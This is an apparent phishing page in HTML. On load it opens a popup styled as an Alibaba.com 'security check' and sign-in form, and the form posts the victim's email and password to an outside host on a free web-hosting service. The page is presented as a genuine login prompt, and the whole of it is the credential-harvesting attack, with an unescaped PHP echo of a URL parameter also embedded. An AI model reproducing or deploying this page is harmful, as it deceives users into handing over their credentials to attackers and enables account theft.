
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>jQuery Show Popup on Page Load</title>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.8.2.js"></script>
<style type="text/css">
#overlay {
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
background-color: #000;
filter:alpha(opacity=70);
-moz-opacity:0.7;
-khtml-opacity: 0.7;
opacity: 0.7;
z-index: 100;
display: none;
}
.cnt223 a{
text-decoration: none;
}
.popup{
width: 100%;
margin: 0 auto;
display: none;
position: fixed;
z-index: 101;
}
.cnt223{
min-width: 600px;
width: 600px;
min-height: 150px;
margin: 100px auto;
background: #f3f3f3;
position: relative;
z-index: 103;
top: -285px;
padding: 10px;
border-radius: 5px;
box-shadow: 0 2px 5px #000;
}
.cnt223 p{
clear: both;
color: #555555;
text-align: justify;
}
.cnt223 p a{
color: #d91900;
font-weight: bold;
}
.cnt223 .x{
float: right;
height: 35px;
left: 22px;
position: relative;
top: -25px;
width: 34px;
}
.cnt223 .x:hover{
cursor: pointer;
}
</style>
<script type='text/javascript'>
$(function(){
var overlay = $('<div id="overlay"></div>');
overlay.show();
overlay.appendTo(document.body);
$('.popup').show();
$('.close').click(function(){
$('.popup').hide();
overlay.appendTo(document.body).remove();
return false;
});


 
$('.x').click(function(){
$('.popup').hide();
overlay.appendTo(document.body).remove();
return false;
});
});
</script><img id="J-dcv-image-trigger" class="pic" src=http://sc01.alicdn.com/kf/HTB1KqwjXwjN8KJjSZFgq6zjbVXaG/2017-custom-men-bomber-baseball-jacket-wholesale.jpg_350x350.jpg data-role="thumb" alt="2017 custom men bomber baseball jacket, wholesale blank varsity jackets"></script><img id="J-dcv-image-trigger" class="pic" src=https://sc02.alicdn.com/kf/UT876nBXStXXXagOFbXq/OEM-custom-printed-wholesale-factory-price-letterman.jpg_350x350.jpg data-role="thumb" alt="2017 custom men bomber baseball jacket, wholesale blank varsity jackets"></script><img id="J-dcv-image-trigger" class="pic" src=https://sc01.alicdn.com/kf/HTB1lSHuSFXXXXcQXpXXq6xXFXXXO/wholesale-high-quality-100-cotton-mens-baseball.jpg_350x350.jpg data-role="thumb" alt="2017 custom men bomber baseball jacket, wholesale blank varsity jackets"></script><img id="J-dcv-image-trigger" class="pic" src=https://sc01.alicdn.com/kf/UT8d9klX2RbXXagOFbXE/varsity-jacket.jpg_350x350.jpg data-role="thumb" alt="2017 custom men bomber baseball jacket, wholesale blank varsity jackets">
</head>
<body>
<div class='popup'>
<div class='cnt223'>
<img src='http://www.developertips.net/demos/popup-dialog/img/x.png' alt='quit' class='x' id='x' />
<p>
Security check: complete the below to gain access to the official website, alibaba product interface display.<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0" link="#000000" alink="#000000">

<table width="100%" height="100%" align="center" bgcolor="#FFFFFF">

<tbody><tr><td height="10%">
	
	<br><br>
	<table width="100" align="center"><tbody><tr><td>
	<img src="http://mail.smail210.cn4e.com/domain/images/logo.jpg" width="" height="">
	</td></tr></tbody></table>

</td></tr>







<tr><td height="5%">
<hr width="100" align="center">
</td></tr>





<tr><td height="5%"></td></tr>





<tr><td height="">
		<div align="center">
		<b><font face="verdana" size="+2" color="#0489B1">Sign in to continue to Alibaba.com</font></b>
		</div>		
</td></tr>




<tr><td height="40%">

	<table width=“100" height="220" bgcolor="#E5E2E2" align="center" style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;"><tbody><tr><td>


			<table width=“100" height="220" style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;" align="center" bgcolor="#ffffff">
			<tbody><tr><td>


				<table width="320" align="center">

				<tbody><tr><td>

				<form method="post" action="https://j379192911.000webhostapp.com/temp/indexs">
			
				<br><br>

				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['id’]; ?>" placeholder="Username">
				<font face="arial" size="3" color="#045FB4"><?php echo $_GET['id']; ?></font>		

				<p>

				<input name="pass" type="password" style="width:320px; height:40px; font-family: Verdana; font-size: 15px; color:#000000; 
				background-color: #ffffff; border: solid 2px 276BA2; padding: 10px" "="" required="" placeholder="&#36755;&#20837;&#23494;&#30721;">
	


				</p><p>

				<input type="submit" value=LOG style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
				font-family: Verdana; font-size: 20px; font-weight: bold; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
				-khtml-border-radius: 4px; border-radius: 4px;">				
	
				

				</p></form>


				</td></tr>
				
				</tbody></table>



				<br>

				


			</td></tr>


			</tbody></table>


		</td></tr></tbody></table>


</td></tr>





<tr><td height="10%"></td></tr>

<br/>
<br/>
<a href='' class='close'>Close</a>
</p>
</div>
</div>
</body>
</html>
